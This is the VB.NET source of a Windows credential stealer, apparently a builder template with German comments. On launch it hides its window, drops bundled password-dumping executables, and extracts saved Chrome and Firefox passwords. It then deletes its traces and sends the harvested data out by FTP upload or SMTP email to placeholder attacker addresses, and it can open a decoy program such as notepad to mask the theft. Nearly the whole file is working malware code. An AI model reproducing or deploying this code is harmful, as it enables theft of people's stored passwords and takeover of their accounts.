Option Strict On

Imports System.Net.Mail

Public Class stealer
    Dim content_to_send As String = ""

    Sub add_to_content(ByVal Input As String)
        content_to_send = content_to_send & Input
    End Sub

    Private Sub WriteProcessOutput(ByVal sendingProcess As Object, ByVal outLine As DataReceivedEventArgs)
        If outLine.Data IsNot Nothing Then
            Me.Invoke(Sub() add_to_content(outLine.Data & Environment.NewLine))
        End If
    End Sub

    Sub dumpchrome()
        IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\chroma.exe", My.Resources.ChromePass)
        Dim p As New Process()
        With p.StartInfo
            .Arguments = "/stext chroma.txt"
            .FileName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\chroma.exe"
            .WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
        End With
        p.Start()
        Do While IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\chroma.exe")
            Try
                IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\chroma.exe")
            Catch
            End Try
        Loop
        add_to_content(vbNewLine & IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\chroma.txt"))
        IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\chroma.txt")
    End Sub

    Sub dumpff()
        IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\gotya.exe", My.Resources.FirePassword)
        Dim p As New Process()
        With p.StartInfo
            .Arguments = "-p auto"
            .FileName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\gotya.exe"
            .WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
        End With
        p.StartInfo.CreateNoWindow = True
        p.StartInfo.UseShellExecute = False
        p.StartInfo.RedirectStandardOutput = True
        AddHandler p.OutputDataReceived, AddressOf WriteProcessOutput
        p.Start()
        p.BeginOutputReadLine()
        Do While IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\gotya.exe")
            Try
                IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\gotya.exe")
            Catch
            End Try
        Loop
    End Sub

    Sub binded(ByVal resource As Byte(), ByVal path As String) 'Datei neu schreiben aus resources
        'Nächste 
        IO.File.WriteAllBytes(path, resource)
        Dim p As New Process()
        With p.StartInfo
            .FileName = path
            .WorkingDirectory = path.Substring(0, path.LastIndexOf("\"))
        End With
        p.Start()
    End Sub

    Public Shared Sub Delay(ByVal dblSecs As Double)
        Const OneSec As Double = 1.0# / (1440.0# * 60.0#)
        Dim dblWaitTil As Date
        Now.AddSeconds(OneSec)
        dblWaitTil = Now.AddSeconds(OneSec).AddSeconds(dblSecs)
        Do Until Now > dblWaitTil
            Application.DoEvents()
        Loop
    End Sub

    Sub binded(ByVal alreadyexistspath As String) 'Datei exestiert schon (z.B. notepad.exe)
        Dim p As New Process()
        With p.StartInfo
            .FileName = alreadyexistspath
            .WorkingDirectory = alreadyexistspath.Substring(0, alreadyexistspath.LastIndexOf("\"))
        End With
        p.Start()
    End Sub

    Sub lab511(ByVal host As String, ByVal username As String, ByVal passwd As String) 'FTP
        Dim daFile As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\" & My.Computer.Name & New Random().Next(1, 999) & ".txt"
        IO.File.AppendAllText(daFile, content_to_send)
        My.Computer.Network.UploadFile(daFile, host & "/" & daFile.Substring(daFile.LastIndexOf("\") + 1), username, passwd)
        Do While IO.File.Exists(daFile)
            Try
                IO.File.Delete(daFile)
            Catch
            End Try
        Loop
    End Sub

    Sub lab511(ByVal gmail As String, ByVal password As String, ByVal to_mail As String, ByVal smtp_port As Integer, ByVal host As String, ByVal useSSL As Boolean)
        Try
            Dim SmtpServer As New SmtpClient()
            Dim mail As New MailMessage()
            SmtpServer.Credentials = New  _
        Net.NetworkCredential(gmail, password)
            SmtpServer.Port = smtp_port
            SmtpServer.Host = host
            SmtpServer.EnableSsl = useSSL
            mail = New MailMessage()
            mail.From = New MailAddress(gmail)
            mail.To.Add(to_mail)
            mail.Subject = My.Computer.Name
            mail.Body = content_to_send
            SmtpServer.Send(mail)
        Catch ex As Exception
            'MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        'Freiwillig
        'binded(My.Resources.notepad, Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\lab.exe") 
        'binded("C:\Windows\System32\notepad.exe")

        dumpff() 'Firefox
        dumpchrome() 'Chrome
        Delay(3) 'Selbstedierbar

        'lab511("ftp://xxxx.de", "Lab511", "Passwort")
        'or 
        'lab511("xxxx@gmail.com", "Passwort", "xxxx@icloud.com", 587, "smtp.gmail.com", True) Von Googlemail nach icloud z.B. 

        Me.Close()
    End Sub
End Class
